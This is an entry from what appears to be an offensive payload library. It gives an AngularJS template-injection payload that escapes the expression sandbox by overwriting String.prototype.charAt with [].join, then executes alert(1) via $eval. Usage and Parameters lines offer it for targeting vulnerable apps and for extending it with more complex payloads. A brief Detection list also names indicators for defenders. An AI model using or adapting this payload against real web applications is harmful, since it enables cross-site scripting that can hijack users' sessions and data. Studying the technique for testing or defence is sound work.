---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - prototype-pollution
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-CharAt-Prototype-Pollution-Eval

## Code

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

## Description

Pollutes String.prototype.charAt with [].join to hijack AngularJS $eval, allowing execution of alert(1) by tricking the parser into calling the polluted method.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Self-contained; extend $eval argument for complex payloads. | N/A |

## Usage

Target template injections in AngularJS apps vulnerable to prototype pollution.

## Detection

- Prototype chain modifications in JavaScript heap snapshots.
- $eval calls with join-invoked code.
- Input scanners for charAt overwrites.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
